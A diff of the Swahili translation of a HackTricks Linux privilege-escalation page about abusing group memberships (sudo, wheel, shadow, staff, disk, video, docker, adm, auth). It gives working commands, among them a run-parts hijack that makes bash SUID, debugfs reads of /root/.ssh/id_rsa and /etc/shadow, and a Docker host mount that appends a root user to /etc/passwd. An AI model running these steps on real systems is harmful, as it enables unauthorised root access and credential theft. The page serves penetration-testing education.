@@ -1,25 +1,25 @@
-# Vikundi Vinavyovutia - Linux Privesc
+# Makundi ya Kuvutia - Linux Privesc
 
 {% hint style="success" %}
-Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
 
-## Vikundi vya Sudo/Admin
+## Makundi ya Sudo/Admin
 
-### **PE - Mbinu ya 1**
+### **PE - Njia 1**
 
-**Marafiki**, **kwa chaguo-msingi (au kwa sababu fulani ya programu inahitaji)** ndani ya faili ya **/etc/sudoers** unaweza kupata mistari hii:
+**Wakati mwingine**, **kwa kawaida (au kwa sababu programu fulani inahitaji hivyo)** ndani ya **/etc/sudoers** faili unaweza kupata baadhi ya mistari hii:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -27,26 +27,26 @@ Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" dat
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-Hii inamaanisha kwamba **mtumiaji yeyote ambaye ni mwanachama wa kikundi cha sudo au admin anaweza kutekeleza chochote kama sudo**.
+Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwenye kundi la sudo au admin anaweza kutekeleza chochote kama sudo**.
 
-Ikiwa hii ndiyo hali, **kwa kuwa root unaweza tu kutekeleza**:
+Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
 ```
 sudo su
 ```
-### PE - Mbinu 2
+### PE - Method 2
 
 Pata binaries zote za suid na angalia kama kuna binary **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Ikiwa utagundua kwamba binary **pkexec ni binary ya SUID** na wewe ni mwanachama wa **sudo** au **admin**, labda unaweza kutekeleza binaries kama sudo ukitumia `pkexec`.\
-Hii ni kwa sababu kwa kawaida hizo ni makundi ndani ya **sera ya polkit**. Sera hii kimsingi inatambua ni makundi gani yanaweza kutumia `pkexec`. Angalia hivyo kwa:
+Ikiwa unapata kwamba **pkexec ni binary ya SUID** na unategemea **sudo** au **admin**, huenda unaweza kutekeleza binaries kama sudo ukitumia `pkexec`.\
+Hii ni kwa sababu kawaida hizo ndizo vikundi ndani ya **polkit policy**. Sera hii kimsingi inatambua ni vikundi vipi vinaweza kutumia `pkexec`. Angalia kwa:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Hapo utapata ni vikundi vipi vinavyoruhusiwa kutekeleza **pkexec** na **kwa chaguo-msingi** katika baadhi ya disctros za linux vikundi **sudo** na **admin** vinatokea.
+Hapo utapata ni vikundi vipi vinavyoruhusiwa kutekeleza **pkexec** na **kwa default** katika baadhi ya disktros za linux vikundi **sudo** na **admin** vinaonekana.
 
-Kuwa **root unaweza kutekeleza**:
+Ili **kuwa root unaweza kutekeleza**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
@@ -56,7 +56,9 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Si kwa sababu huna ruhusa bali ni kwa sababu hujahusishwa bila GUI**. Na kuna njia ya kupita katika tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **vikao vya ssh 2 tofauti**:
+**Sio kwa sababu huna ruhusa bali kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho kwa tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **sessions 2 tofauti za ssh**:
+
+{% code title="session1" %}
 ```bash
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -64,38 +66,38 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 ```
 {% endcode %}
 
-{% code title="kikao2" %}
+{% code title="session2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
 {% endcode %}
 
-## Kikundi cha Gari
+## Wheel Group
 
-**Wakati mwingine**, **kwa chaguo-msingi** ndani ya faili ya **/etc/sudoers** unaweza kupata mstari huu:
+**Wakati mwingine**, **kwa kawaida** ndani ya faili ya **/etc/sudoers** unaweza kupata mstari huu:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
-Hii inamaanisha kwamba **mtumiaji yeyote ambaye ni mwanachama wa kikundi cha wheel anaweza kutekeleza chochote kama sudo**.
+Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwa kundi la wheel anaweza kutekeleza chochote kama sudo**.
 
-Ikiwa hii ndiyo hali, **kwa kuwa mtumiaji wa mizizi unaweza tu kutekeleza**:
+Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
 ```
 sudo su
 ```
-## Kikundi cha Shadow
+## Shadow Group
 
-Watumiaji kutoka kwa **kikundi cha shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
+Watumiaji kutoka kwa **group shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-Jadi, soma faili na jaribu **kuvunja baadhi ya hashes**.
+So, read the file and try to **crack some hashes**.
 
-## Kikundi cha Wafanyakazi
+## Staff Group
 
-**staff**: Inaruhusu watumiaji kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji mamlaka ya mzizi (kumbuka kwamba programu zinazoweza kutekelezwa katika `/usr/local/bin` zimo kwenye kifaa cha PATH cha mtumiaji yeyote, na wanaweza "kubadilisha" programu zinazoweza kutekelezwa katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kikundi "adm", ambacho kina uhusiano zaidi na ufuatiliaji/usalama. [\[chanzo\]](https://wiki.debian.org/SystemGroups)
+**staff**: Inaruhusu watumiaji kuongeza mabadiliko ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji ruhusa za root (zingatia kwamba executable katika `/usr/local/bin` ziko kwenye mabadiliko ya PATH ya mtumiaji yeyote, na zinaweza "kufunika" executable katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kundi "adm", ambalo lina uhusiano zaidi na ufuatiliaji/usalama. [\[source\]](https://wiki.debian.org/SystemGroups)
 
-Katika usambazaji wa debian, `$PATH` inaonyesha kuwa `/usr/local/` itatekelezwa kwa kipaumbele cha juu, iwe wewe ni mtumiaji aliye na mamlaka au la.
+Katika usambazaji wa debian, mabadiliko ya `$PATH` yanaonyesha kwamba `/usr/local/` itatekelezwa kama kipaumbele cha juu zaidi, iwe wewe ni mtumiaji mwenye ruhusa au la.
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -103,9 +105,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-### Kama tunaweza kuchukua udhibiti wa baadhi ya programu katika `/usr/local`, tunaweza kwa urahisi kupata mizizi.
+Ikiwa tunaweza kuhamasisha programu fulani katika `/usr/local`, tunaweza kwa urahisi kupata root.
 
-Kuchukua udhibiti wa programu ya `run-parts` ni njia rahisi ya kupata mizizi, kwa sababu programu nyingi zitaruhusu `run-parts` kama (crontab, wakati wa kuingia kwa ssh).
+Kuhamasisha programu ya `run-parts` ni njia rahisi ya kupata root, kwa sababu programu nyingi zitakimbia `run-parts` kama (crontab, wakati wa kuingia ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -113,7 +115,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-Au Wakati wa kuingia kwa kikao kipya cha ssh.
+au Wakati wa kuingia kwenye kikao kipya cha ssh.
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -126,7 +128,7 @@ $ pspy64
 2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
 2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
 ```
-**Tumia Kwa Mbinu ya Kudhibiti**
+**Kuvunja**
 ```bash
 # 0x1 Add a run-parts script in /usr/local/bin/
 $ vi /usr/local/bin/run-parts
@@ -145,11 +147,11 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
-## Kikundi cha Diski
+## Disk Group
 
-Haki hii ni karibu **sawa na ufikiaji wa root** kwa sababu unaweza kupata data yote ndani ya mashine.
+Hii haki ni karibu **sawa na ufikiaji wa root** kwani unaweza kufikia data zote ndani ya mashine.
 
-Faili: `/dev/sd[a-z][1-9]`
+Files:`/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -158,47 +160,47 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Tafadhali kumbuka kwamba kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili kuiga `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
+Kumbuka kwamba kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili nakala ya `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-Hata hivyo, ikiwa unajaribu **kuandika faili zinazomilikiwa na root** (kama vile `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Ruhusa imekataliwa**".
+Hata hivyo, ikiwa unajaribu **kuandika faili zinazomilikiwa na root** (kama `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Ruhusa imekataliwa**".
 
-## Kikundi cha Video
+## Kundi la Video
 
-Kwa kutumia amri `w` unaweza kupata **nani ameingia kwenye mfumo** na itaonyesha matokeo kama yafuatayo:
+Kwa kutumia amri `w` unaweza kupata **nani aliyeingia kwenye mfumo** na itatoa matokeo kama ifuatavyo:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-**tty1** inamaanisha kuwa mtumiaji **yossi ameingia kimwili** kwenye terminal kwenye mashine.
+The **tty1** inamaanisha kwamba mtumiaji **yossi ameunganishwa kimwili** kwenye terminal kwenye mashine.
 
-Kikundi cha **video** kina ufikivu wa kuona matokeo ya skrini. Kimsingi unaweza kuchunguza skrini. Ili kufanya hivyo unahitaji **kunasa picha ya sasa kwenye skrini** kwa data ghafi na kupata azimio linalotumiwa na skrini hiyo. Data ya skrini inaweza kuokolewa kwenye `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
+Kikundi cha **video** kina ufikiaji wa kuangalia matokeo ya skrini. Kimsingi unaweza kuangalia skrini. Ili kufanya hivyo unahitaji **kuchukua picha ya sasa kwenye skrini** katika data safi na kupata azimio ambalo skrini inatumia. Data ya skrini inaweza kuhifadhiwa katika `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Kufungua **picha ya raw** unaweza kutumia **GIMP**, chagua faili ya \*\*`screen.raw` \*\* na chagua aina ya faili **Raw image data**:
+Ili **fungua** **picha ya raw** unaweza kutumia **GIMP**, chagua faili ya \*\*`screen.raw` \*\* na chagua kama aina ya faili **Data ya picha ya raw**:
 
 ![](<../../../.gitbook/assets/image (463).png>)
 
-Kisha badilisha Upana na Urefu kwa wale wanaotumiwa kwenye skrini na angalia Aina tofauti za Picha (na chagua ile inayoonyesha vizuri skrini):
+Kisha badilisha Upana na Kimo kuwa zile zinazotumika kwenye skrini na angalia Aina tofauti za Picha (na uchague ile inayoonyesha vizuri skrini):
 
 ![](<../../../.gitbook/assets/image (317).png>)
 
-## Kikundi cha Root
+## Kundi la Root
 
-Inaonekana kwa chaguo-msingi **wanachama wa kikundi cha root** wanaweza kupata ufikiaji wa **kurekebisha** baadhi ya **faili za usanidi wa huduma** au baadhi ya **faili za maktaba** au **vitu vingine vya kuvutia** ambavyo vinaweza kutumika kwa kukuza mamlaka...
+Inaonekana kwamba kwa kawaida **wanachama wa kundi la root** wanaweza kuwa na ufikiaji wa **kubadilisha** baadhi ya **faili za usanidi** wa **huduma** au baadhi ya **faili za maktaba** au **mambo mengine ya kuvutia** ambayo yanaweza kutumika kuongeza mamlaka...
 
-**Angalia ni faili gani wanachama wa root wanaweza kurekebisha**:
+**Angalia ni faili zipi wanachama wa root wanaweza kubadilisha**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-## Kikundi cha Docker
+## Docker Group
 
-Unaweza **kufunga mfumo wa faili wa mzizi wa kompyuta mwenyeji kwa kiasi cha kifaa**, hivyo wakati kifaa kinaanza mara moja hupakia `chroot` kwenye kiasi hicho. Hii kimsingi inakupa mizizi kwenye kompyuta.
+Unaweza **kuunganisha mfumo wa faili wa mizizi wa mashine mwenyeji kwenye kiasi cha mfano**, hivyo wakati mfano unapoanza inachaji mara moja `chroot` kwenye kiasi hicho. Hii kwa ufanisi inakupa mizizi kwenye mashine.
 ```bash
 docker image #Get images from the docker service
 
@@ -210,18 +212,45 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-## Kikundi cha lxc/lxd
+Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:
+
+{% content-ref url="../docker-security/" %}
+[docker-security](../docker-security/)
+{% endcontent-ref %}
+
+If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
+
+{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
+
+{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
+
+## lxc/lxd Group
 
 {% content-ref url="./" %}
 [.](./)
 {% endcontent-ref %}
 
-## Kikundi cha Adm
+## Adm Group
 
-Kawaida **wanachama** wa kikundi cha **`adm`** wana ruhusa ya **kusoma faili za logi** zilizopo ndani ya _/var/log/_.\
-Hivyo, ikiwa umefanikiwa kudukua mtumiaji ndani ya kikundi hiki unapaswa bila shaka **kuangalia kwenye logi**.
+Kawaida **wanachama** wa kundi **`adm`** wana ruhusa za **kusoma** faili za log zilizoko ndani ya _/var/log/_.\
+Hivyo, ikiwa umepata udhaifu wa mtumiaji ndani ya kundi hili unapaswa kuangalia **logi**.
 
-## Kikundi cha Auth
+## Auth group
 
-Ndani ya OpenBSD kikundi cha **auth** kawaida kinaweza kuandika kwenye folda _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
-Ruhusa hizi zinaweza kutumiwa vibaya na shambulio lifuatalo kwa lengo la **kuinua mamlaka** hadi kwa mtumiaji wa root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Ndani ya OpenBSD kundi la **auth** kawaida linaweza kuandika katika folda _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
+Ruhusa hizi zinaweza kutumika vibaya kwa kutumia exploit ifuatayo ili **kuinua mamlaka** hadi root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Support HackTricks</summary>
+
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</details>
+{% endhint %}
